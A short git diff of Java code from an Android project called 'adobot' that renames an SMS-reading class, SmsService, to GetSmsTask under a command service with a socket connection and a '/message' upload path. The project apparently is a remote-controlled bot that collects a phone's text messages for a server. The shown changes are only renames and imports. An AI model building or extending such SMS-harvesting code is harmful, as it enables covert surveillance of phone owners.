@@ -1,13 +1,15 @@
-package com.android.adobot;
+package com.android.adobot.tasks;
 
 import android.Manifest;
 import android.content.ContentResolver;
-import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
+
+import com.android.adobot.CommandService;
+import com.android.adobot.CommonParams;
 
 import org.json.JSONObject;
 
@@ -15,15 +17,12 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.HashMap;
 
-import http.Http;
+import com.android.adobot.http.Http;
 import io.socket.client.Socket;
 
-import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
-import static android.content.Intent.FLAG_ACTIVITY_NO_HISTORY;
+public class GetSmsTask extends BaseTask {
 
-public class SmsService extends BaseService {
-
-    private static String TAG = "SmsService";
+    private static String TAG = "GetSmsTask";
 
     public static final String POSTURL = "/message";
 
@@ -31,7 +30,7 @@ public class SmsService extends BaseService {
     private Socket socket;
     private int numsms;
 
-    public SmsService(Client client, int numsms) {
+    public GetSmsTask(CommandService client, int numsms) {
         context = client;
         this.socket = client.getSocket();
         this.numsms = numsms;
@@ -40,7 +39,7 @@ public class SmsService extends BaseService {
 
     @Override
     public void run() {
-        Log.i(TAG, "Running SmsService ......\n");
+        Log.i(TAG, "Running GetSmsTask ......\n");
         getAllSms();
     }
 
